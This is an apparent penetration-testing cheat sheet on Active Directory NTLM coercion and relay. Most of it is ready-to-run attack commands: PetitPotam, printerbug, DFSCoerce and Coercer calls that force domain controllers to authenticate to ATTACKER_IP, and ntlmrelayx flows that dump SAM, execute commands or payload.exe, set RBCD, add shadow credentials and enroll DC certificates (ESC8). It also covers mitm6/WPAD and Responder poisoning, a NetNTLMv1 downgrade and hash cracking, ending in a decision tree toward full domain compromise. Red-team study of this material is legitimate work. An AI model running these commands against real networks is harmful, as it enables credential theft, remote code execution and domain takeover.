# AD - NTLM Coercion & Relay

## Table of Contents
- [NTLM Recap (Relay-Relevant Only)](#ntlm-recap-relay-relevant-only)
- [Why Signing & Channel Binding Matter](#why-signing--channel-binding-matter)
- [Coercion Techniques](#coercion-techniques)
- [WebDAV Coercion (Forcing HTTP)](#webdav-coercion-forcing-http)
- [Cross-Protocol Relay Constraints](#cross-protocol-relay-constraints)
- [ntlmrelayx Targets & Flows](#ntlmrelayx-targets--flows)
- [Relay to SMB (exec / secretsdump)](#relay-to-smb-exec--secretsdump)
- [Relay to LDAP/LDAPS (RBCD / Shadow Creds)](#relay-to-ldapldaps-rbcd--shadow-creds)
- [Relay to ADCS HTTP = ESC8](#relay-to-adcs-http--esc8)
- [Relay to MSSQL](#relay-to-mssql)
- [Relay to HTTP / AD FS](#relay-to-http--ad-fs)
- [mitm6 / DHCPv6 + WPAD](#mitm6--dhcpv6--wpad)
- [Responder Configuration](#responder-configuration)
- [Capturing vs Relaying NetNTLM](#capturing-vs-relaying-netntlm)
- [NetNTLMv1 Downgrade & crack.sh](#netntlmv1-downgrade--cracksh)
- [Relay Decision Tree](#relay-decision-tree)

For ADCS certificate templates and ESC techniques (esp. ESC8/ESC11 relay) see [adcs.md](adcs.md). For ACL edges reached after relay (RBCD, shadow creds) see [acl-abuse.md](acl-abuse.md). For detection footprint of relay/coercion see [opsec-and-detection.md](opsec-and-detection.md).

---

## NTLM Recap (Relay-Relevant Only)
NTLM is a challenge-response protocol carried inside another protocol (SMB, LDAP, HTTP, MSSQL/TDS, RPC). Three messages: NEGOTIATE (type 1, client), CHALLENGE (type 2, server 8-byte nonce), AUTHENTICATE (type 3, client response). The type-3 response is computed from the victim's NT hash but the hash never crosses the wire — so it cannot be replayed as a hash, but the *whole authenticated session* can be forwarded (relayed) to a different server before the client finishes it.

Key facts for relay:
- A relay is a MITM: attacker receives a victim's type-1/type-3 and forwards them to a chosen target, ending up authenticated *as the victim* against that target.
- You cannot relay back to the originating host (reflection) since MS08-068 / CVE-2008-4037 mitigations; same-host relay is blocked.
- Relay works only if the target does not *require* session signing/binding that the relayed session cannot satisfy.

## Why Signing & Channel Binding Matter
Signing binds the authenticated session to the negotiated key; a relayed session lacks the session key material to sign, so a signing-required target drops the relayed connection.

- **SMB signing**: If target requires SMB signing, relay to SMB fails. DCs require it by default; member servers usually do NOT. Enumerate:
```bash
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt   # NetExec: hosts with signing NOT required
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt
nmap --script smb2-security-mode -p445 10.10.10.0/24
```
- **LDAP signing + channel binding (EPA)**: LDAP over 389 can require signing; LDAPS (636) can require channel binding (EPA / `LdapEnforceChannelBinding`). If LDAP signing is enforced, plain LDAP relay fails; if channel binding is enforced on LDAPS, LDAPS relay fails. Many domains still leave both off (default is "negotiate", not "required") — CVE-2019-1040 (drop MIC) historically bypassed signing negotiation.
- **EPA (Extended Protection for Authentication)**: binds NTLM to the outer TLS channel (HTTP/LDAPS). If ADCS web enrollment or AD FS enforces EPA, HTTP relay to it fails.

## Coercion Techniques
Coercion forces a target (ideally a DC or server with a privileged machine/user context) to authenticate to attacker over SMB/HTTP so you can relay it. Applies when you have any authenticated domain context (or sometimes unauthenticated) and network reach.

```bash
# PrinterBug / SpoolSample (MS-RPRN) - forces target to auth to listener over SMB
# Linux (impacket):
printerbug.py 'DOMAIN/user:password'@<TARGET_DC> <ATTACKER_IP>
dementor.py <ATTACKER_IP> <TARGET_DC> -u user -p password -d domain
# Windows:
SpoolSample.exe <TARGET_DC> <ATTACKER_IP>

# PetitPotam (MS-EFSRPC EfsRpcOpenFileRaw etc.) - often works unauthenticated pre-patch
# Linux:
PetitPotam.py -u user -p password -d domain <ATTACKER_IP> <TARGET_DC>
PetitPotam.py <ATTACKER_IP> <TARGET_DC>              # anonymous attempt
# Windows:
PetitPotam.exe <ATTACKER_IP> <TARGET_DC>

# DFSCoerce (MS-DFSNM NetrDfsAddStdRoot) - works even after PetitPotam patches
dfscoerce.py -u user -p password -d domain <ATTACKER_IP> <TARGET_DC>

# ShadowCoerce (MS-FSRVP) - VSS-based
shadowcoerce.py -u user -p password -d domain <ATTACKER_IP> <TARGET_DC>

# Coercer - tries ALL known coercion RPC methods automatically
coercer coerce -u user -p password -d domain -l <ATTACKER_IP> -t <TARGET_DC>
coercer scan  -u user -p password -d domain -t <TARGET_DC>   # enumerate reachable methods first
```
Coerce toward a **WebDAV/HTTP** listener when you need HTTP for ESC8 or AD FS — see below. Coerce toward **SMB** for SMB/LDAP relay flows.

## WebDAV Coercion (Forcing HTTP)
NTLM over HTTP (needed for ADCS web enrollment / AD FS relay) requires the victim to speak WebDAV. The WebClient service must be running on the coerced host. Coerce with a `@` UNC or a `@SSL@port` form so the client uses HTTP/WebDAV instead of SMB.

```bash
# Check / trigger WebClient on targets
nxc smb 10.10.10.0/24 -u user -p pass -M webdav          # list hosts with WebClient running
# Start WebClient remotely if needed (requires access):
# - drop a searchConnector-ms / .library-ms file on a writable share, or
# - use the below to trigger via a UNC that resolves as WebDAV
GetWebDAVStatus.exe <TARGET>                              # check status

# Coerce over HTTP: append @80/ (or @SSL@443/) to the listener host so it uses WebDAV
PetitPotam.py -u user -p pass -d domain "attacker@80/x" <TARGET>
coercer coerce -u user -p pass -d domain -l "attacker@80/x" -t <TARGET>
printerbug.py 'DOMAIN/user:pass'@<TARGET> "attacker@80/x"
```
Note: The coerced HTTP auth carries the **machine account** of the coerced host. Machine accounts cannot relay to LDAP to modify themselves usefully unless combined with RBCD/shadow-creds tricks; they are ideal for ESC8 (enroll a machine cert) and for RBCD when relayed to LDAP.

## Cross-Protocol Relay Constraints
NTLM type-1 negotiates flags that pin the protocol context. A session captured over one protocol can only be relayed to another if signing/MIC/channel-binding do not block it.

| From (captured over) | To SMB | To LDAP | To LDAPS | To HTTP (ADCS/ADFS) | To MSSQL |
|---|---|---|---|---|---|
| SMB | yes (if no SMB signing) | **NO** without MIC-drop* | **NO** (channel binding) | yes | yes |
| HTTP/WebDAV | yes | yes (if no LDAP signing) | yes (if no EPA) | yes | yes |
| LDAP | yes | yes | limited | yes | yes |

\* SMB→LDAP is blocked because the SMB client sets a MIC (message integrity code) in the type-3 that binds the auth to SMB; LDAP signing negotiation rejects it. CVE-2019-1040 ("drop the MIC", `--remove-mic`) removed that binding, re-enabling SMB→LDAP; patched DCs reject it. This is why **HTTP-based coercion (WebDAV) is preferred when the goal is LDAP relay** (RBCD / shadow creds) — HTTP sessions carry no such MIC binding.

## ntlmrelayx Targets & Flows
`ntlmrelayx.py` (impacket) is the relay engine. `-t`/`-tf` set target(s); the *scheme* in the target URL picks the protocol.

```bash
# Core flags:
#   -t smb://HOST | ldap://HOST | ldaps://HOST | http://HOST/certsrv/... | mssql://HOST
#   -tf targets.txt        one target per line (with scheme)
#   -smb2support           allow SMB2
#   -socks                 open a SOCKS proxy holding authenticated sessions (don't act, just hold)
#   -6                     listen on IPv6 (for mitm6)
#   --no-http-server / --no-smb-server / --no-wcf-server / --no-raw-server   disable listeners you don't need
```

### Relay to SMB (exec / secretsdump)
Applies when relayed identity is local admin on the SMB target and SMB signing is off.
```bash
ntlmrelayx.py -tf relay_targets.txt -smb2support                       # default: dump SAM
ntlmrelayx.py -t smb://10.10.10.20 -smb2support -c "whoami"            # exec a command
ntlmrelayx.py -t smb://10.10.10.20 -smb2support --shadow-credentials   # n/a for smb; see ldap
ntlmrelayx.py -tf targets.txt -smb2support -e payload.exe             # relay+execute binary
```

### Relay to LDAP/LDAPS (RBCD / Shadow Creds)
Requires a coerced **machine account over HTTP/WebDAV** (or CVE-2019-1040 for SMB source) and LDAP signing / channel-binding not enforced. Relayed machine acct writes to the *victim machine's own* AD object.
```bash
# Resource-Based Constrained Delegation: grant an attacker-controlled computer the right to impersonate.
ntlmrelayx.py -t ldaps://<DC> --delegate-access \
    --escalate-user ATTACKERPC$          # sets msDS-AllowedToActOnBehalfOfOtherIdentity
# then:
getST.py -spn cifs/victim.domain.local domain/ATTACKERPC$ -hashes :<hash> -impersonate Administrator

# Shadow Credentials: add a key credential (msDS-KeyCredentialLink) to the victim object -> PKINIT.
ntlmrelayx.py -t ldaps://<DC> --shadow-credentials --shadow-target 'victim$'

# If you lack a pre-created computer, ntlmrelayx can add one (needs MachineAccountQuota > 0):
ntlmrelayx.py -t ldaps://<DC> --delegate-access --add-computer ATTACKERPC 'Password123!'
```

### Relay to ADCS HTTP = ESC8
ADCS Web Enrollment (`/certsrv/`) accepting NTLM over HTTP with no EPA. Relay a coerced **DC machine account** to enroll a cert as that DC, then use the cert for PKINIT/S4U → full domain compromise.
```bash
ntlmrelayx.py -t http://<CA_HOST>/certsrv/certfnsh.asp -smb2support \
    --adcs --template DomainController          # template: Machine for computers, User for users
# Then coerce DC01 to auth to attacker (SMB is fine for ESC8; DC will use SMB, HTTP relay target):
PetitPotam.py <ATTACKER_IP> <DC01>
# ntlmrelayx prints a base64 PFX / cert; request a TGT:
gettgtpkinit.py -pfx-base64 <b64> domain/DC01\$ dc01.ccache
# or certipy:
certipy auth -pfx dc01.pfx -dc-ip <DC_IP>
```

### Relay to MSSQL
Relayed identity is a SQL login (Windows auth). Get command exec if it is sysadmin / can enable xp_cmdshell.
```bash
ntlmrelayx.py -t mssql://<SQL_HOST> -smb2support -q "SELECT system_user;"
ntlmrelayx.py -t mssql://<SQL_HOST> -smb2support   # then via -socks: mssqlclient over the held session
```

### Relay to HTTP / AD FS
AD FS and other NTLM-backed HTTP endpoints. EPA on AD FS blocks most modern relays.
```bash
ntlmrelayx.py -t https://adfs.domain.local/adfs/services/trust/2005/windowstransport -smb2support
```

## mitm6 / DHCPv6 + WPAD
Windows prefers IPv6 and auto-requests a DHCPv6 lease. `mitm6` answers as rogue DHCPv6 + DNS, becoming the victim's DNS; combined with WPAD, victims fetch a proxy config and auth to attacker (great NTLM source over HTTP). Applies on any LAN where IPv6 isn't hardened.
```bash
# Terminal 1: poison DHCPv6 + DNS (only respond to the target domain to limit blast radius / scope)
mitm6 -d domain.local -i eth0
# also: --host-allowlist / --relay to restrict which hosts you respond to (respect engagement scope)

# Terminal 2: relay WPAD-triggered HTTP auth to LDAPS for delegation
ntlmrelayx.py -6 -t ldaps://<DC> -wh attacker-wpad --delegate-access
#   -wh   WPAD hostname to serve; victims requesting http://wpad/wpad.dat authenticate to us
```

## Responder Configuration
Responder poisons LLMNR/NBT-NS/mDNS to capture NetNTLM. When *relaying* with ntlmrelayx you must free the SMB/HTTP ports Responder would otherwise hold — disable Responder's SMB & HTTP so ntlmrelayx can bind them.
```bash
# /etc/responder/Responder.conf  (or /usr/share/responder/Responder.conf)
#   SMB = Off
#   HTTP = Off
# Keep poisoners (LLMNR/NBT-NS/mDNS) ON to drive victims to you; let ntlmrelayx own SMB/HTTP.
responder -I eth0 -v                    # capture mode (hashes to hashcat)
responder -I eth0 -A                    # Analyze/passive: observe only, no poisoning (recon, low noise)
# When relaying: run Responder with SMB/HTTP off + ntlmrelayx bound to 445/80/443.
```
Disable Responder's WPAD/HTTP when using mitm6 (mitm6+ntlmrelayx serve WPAD themselves) to avoid port conflicts.

## Capturing vs Relaying NetNTLM
- **Capture** (Responder default): store the NetNTLMv1/v2 and crack offline. Use when no relay target is available (signing everywhere) or you want the cleartext.
```bash
hashcat -m 5600 netntlmv2.txt wordlist.txt          # NetNTLMv2
hashcat -m 5500 netntlmv1.txt wordlist.txt          # NetNTLMv1
```
- **Relay**: forward live, never touch the hash. Use when target lacks signing and the identity is privileged there. Machine-account hashes are effectively uncrackable, so relaying is the only path for those.

## NetNTLMv1 Downgrade & crack.sh
If a host still permits NetNTLMv1 (LmCompatibilityLevel <= 2), the response is DES-based and reversible to the NT hash via rainbow tables (crack.sh). Downgrade by having Responder force v1.
```bash
# Responder.conf: set a challenge that crack.sh has tables for
#   Challenge = 1122334455667788
# Enable downgrade in newer Responder:
responder -I eth0 --lm --disable-ess     # request LM + disable Extended Session Security (forces crackable v1)
# Coerce a machine (PetitPotam/printerbug) to send NetNTLMv1, capture, then:
#   submit to crack.sh (NTLM format) -> recover the machine's NT hash -> use for silver ticket / RBCD.
```
Format for crack.sh: `username::hostname:LMresp:NTresp:1122334455667788` → returns the NT hash. With a DC's machine-account NT hash you can silver-ticket or perform DCSync setup.

## Relay Decision Tree
```
1. Do relay targets exist? -> nxc smb <range> --gen-relay-list (hosts w/o SMB signing)
   |-- none & DCs only     -> capture + crack, OR go ADCS ESC8 (HTTP), OR NetNTLMv1 downgrade
2. What identity will you coerce?
   |-- user w/ local admin on a member server -> relay to SMB (secretsdump / exec)
   |-- DC / machine account                   -> relay to ADCS HTTP (ESC8) or LDAPS (RBCD/shadow)
3. What protocol is the coerced auth?
   |-- need LDAP (RBCD/shadow) -> MUST source over HTTP/WebDAV (SMB->LDAP blocked unless CVE-2019-1040)
   |-- need SMB exec           -> SMB source is fine
   |-- need ESC8               -> SMB source is fine (HTTP target); ensure no EPA on /certsrv
4. Signing/EPA check:
   |-- SMB signing required on target  -> pick a different target or ADCS/HTTP path
   |-- LDAP signing enforced           -> use HTTP source + hope channel binding off, or abandon LDAP
   |-- LDAPS channel binding (EPA)     -> LDAPS relay dead; try plain LDAP or ADCS
5. Trigger: Coercer/PetitPotam/DFSCoerce/printerbug -> ntlmrelayx with chosen -t scheme.
6. No coercion primitive? -> Responder LLMNR/NBT-NS poisoning or mitm6 WPAD to harvest auth.
```
